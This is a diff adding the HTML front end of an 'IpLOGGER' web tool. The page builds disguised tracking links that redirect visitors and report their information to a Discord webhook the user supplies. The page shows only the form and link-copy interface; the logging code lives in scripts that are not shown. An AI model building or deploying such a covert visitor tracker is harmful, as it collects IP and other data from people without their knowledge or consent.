@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>IpLOGGER | b70ga</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/animations.css">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+</head>
+<body>
+    <div id="particles-container"></div>
+    
+    <div class="container">
+        <div class="card">
+            <div class="logo">
+                <span class="logo-text">IpLOGGER | b70ga</span>
+                <div class="logo-glow"></div>
+            </div>
+            
+            <div id="step1" class="step active">
+                <h2>Create Tracking Link</h2>
+                <div class="input-group">
+                    <label for="webhook">Discord Webhook URL</label>
+                    <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+                    <span class="error" id="webhook-error"></span>
+                </div>
+                
+                <div class="input-group">
+                    <label for="redirect">Redirect URL</label>
+                    <input type="text" id="redirect" placeholder="https://example.com">
+                    <span class="error" id="redirect-error"></span>
+                </div>
+                
+                <div class="input-group">
+                    <label for="message">Discord Message (optional)</label>
+                    <input type="text" id="message" placeholder="Someone clicked your link!">
+                </div>
+                
+                <button id="generate-btn" class="btn">Generate Link</button>
+            </div>
+            
+            <div id="step2" class="step">
+                <h2>Your Tracking Link</h2>
+                <div class="generated-link-container">
+                    <input type="text" id="generated-link" readonly>
+                    <button id="copy-btn" class="btn-icon">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                        </svg>
+                    </button>
+                </div>
+                <p class="info-text">Send this link to track visitor information.</p>
+                <button id="create-new-btn" class="btn btn-outline">Create New Link</button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2025 IpLOGGER | b70ga</p>
+    </footer>
+
+    <script src="js/particles.js"></script>
+    <script src="js/utils.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
